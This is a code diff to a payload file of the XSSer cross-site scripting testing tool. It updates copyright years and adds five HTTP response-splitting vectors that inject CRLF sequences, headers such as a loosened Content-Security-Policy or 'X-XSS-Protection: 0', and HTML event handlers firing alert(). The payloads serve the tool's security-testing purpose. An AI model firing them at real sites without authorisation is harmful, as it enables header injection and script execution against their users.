@@ -4,7 +4,7 @@
 """
 This file is part of the XSSer project, https://xsser.03c8.net
 
-Copyright (c) 2010/2019 | psy <epsylon@riseup.net>
+Copyright (c) 2010/2026 | psy <epsylon@riseup.net>
 
 xsser is free software; you can redistribute it and/or modify it under
 the terms of the GNU General Public License as published by the Free
@@ -45,5 +45,15 @@ HTTPrs_vectors = [
 		{ 'payload' : """%0d%0aContent-Type: text/html%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aPragma:no-cache%0d%0aContent-Type: text/html%0d%0a%0d%0a<html>PAYLOAD</html>%20HTTP/1.1""",
 		  'browser' : """[Induced Injection]""" },
 		{ 'payload' : """%0d%0AContent-Type: text/html;charset=UTF-7%0A%0A%2BADw-script%2BAD4-alert('PAYLOAD');%2BADw-/script%2BAD4-""",
-          'browser' : """[Induced Injection]""" }
+          'browser' : """[Induced Injection]""" },
+        { 'payload':"""%0d%0aContent-Type: text/html%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<svg onload=alert("PAYLOAD")>""",
+          'browser':"""[Induced Injection]"""},
+        { 'payload':"""%0d%0aContent-Type: text/html%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<details open ontoggle=alert("PAYLOAD")>""",
+          'browser':"""[Induced Injection]"""},
+        { 'payload':"""%0d%0aContent-Type: text/html%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<img src=x onerror=alert("PAYLOAD")>""",
+          'browser':"""[Induced Injection]"""},
+        { 'payload':"""%0d%0aContent-Security-Policy:%20script-src%20%27unsafe-inline%27%0d%0a%0d%0a<script>alert("PAYLOAD")</script>""",
+          'browser':"""[Induced Injection]"""},
+        { 'payload':"""%0d%0aX-XSS-Protection:%200%0d%0aContent-Type: text/html%0d%0a%0d%0a<svg><animate onbegin=alert("PAYLOAD") attributeName=x dur=1s>""",
+          'browser':"""[Induced Injection]"""},
 		]
